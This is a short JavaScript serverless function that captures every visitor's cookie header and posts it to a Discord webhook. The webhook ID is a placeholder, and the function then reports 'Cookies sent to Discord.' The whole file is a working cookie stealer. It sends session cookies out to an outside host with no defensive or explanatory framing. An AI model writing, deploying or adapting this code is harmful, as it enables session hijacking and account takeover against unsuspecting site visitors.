exports.handler = async (event) => {
    const cookies = event.headers.cookie || "No cookies found";
  
    const payload = {
      content: `🍪 **Cookies from visitor:**\n\`\`\`\n${cookies}\n\`\`\``
    };
  
    try {
      await fetch("https://discord.com/api/webhooks/YOUR-WEBHOOK-ID-HERE", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
  
      return {
        statusCode: 200,
        body: "Cookies sent to Discord."
      };
    } catch (error) {
      return {
        statusCode: 500,
        body: `Error: ${error.message}`
      };
    }
  };
  